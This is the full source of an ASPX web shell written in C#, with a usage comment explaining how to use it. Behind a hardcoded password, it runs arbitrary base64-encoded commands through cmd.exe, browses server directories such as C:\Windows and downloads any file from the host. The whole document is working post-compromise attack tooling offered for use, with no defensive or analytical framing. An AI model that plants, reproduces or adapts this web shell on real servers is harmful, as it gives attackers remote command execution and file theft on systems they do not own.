<%-- ASPX Webshell usage
1. Execute command: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=exec&cmd=Y2QgLiAmJiBkaXI= (base64 for cd . && dir)
2. Browse directory: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=browse&path=C:\Windows
3. Download file: Click on file link from browse mode Or use: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=download&file=C:\Windows\win.ini
--%>

<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string password = "Pass123"; //NOTE: Set your password !
        string input = Request["auth"];

        if (input != password)
        {
            Response.Write("<form method='get'>Password: <input type='password' name='auth'><input type='submit' value='Enter'></form>");
            Response.End();
        }

        string mode = Request["mode"];

        if (mode == "exec")
        {
            string encoded = Request["cmd"];
            if (!string.IsNullOrEmpty(encoded))
            {
                string cmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                Process proc = Process.Start(psi);
                StreamReader sr = proc.StandardOutput;
                Response.Write("<pre>" + Server.HtmlEncode(sr.ReadToEnd()) + "</pre>");
            }
        }
        else if (mode == "browse")
        {
            string path = Request["path"];
            if (string.IsNullOrEmpty(path)) path = Server.MapPath(".");
            if (Directory.Exists(path))
            {
                Response.Write("<h3>Directory Listing: " + path + "</h3><ul>");
                foreach (string dir in Directory.GetDirectories(path))
                {
                    Response.Write("<li><b>[DIR]</b> " + dir + "</li>");
                }
                foreach (string file in Directory.GetFiles(path))
                {
                    Response.Write("<li>[FILE] <a href='?auth=" + password + "&mode=download&file=" + HttpUtility.UrlEncode(file) + "'>" + Path.GetFileName(file) + "</a></li>");
                }
                Response.Write("</ul>");
            }
            else
            {
                Response.Write("Invalid path.");
            }
        }
        else if (mode == "download")
        {
            string file = Request["file"];
            if (File.Exists(file))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(file));
                Response.WriteFile(file);
                Response.End();
            }
            else
            {
                Response.Write("File not found.");
            }
        }
        else
        {
            Response.Write("Usage: ?auth=PASSWORD&mode=exec&cmd=BASE64-encoded-cmd | ?auth=PASSWORD&mode=browse&path=DIR | ?auth=PASSWORD&mode=download&file=PATH");
        }
    }
</script>
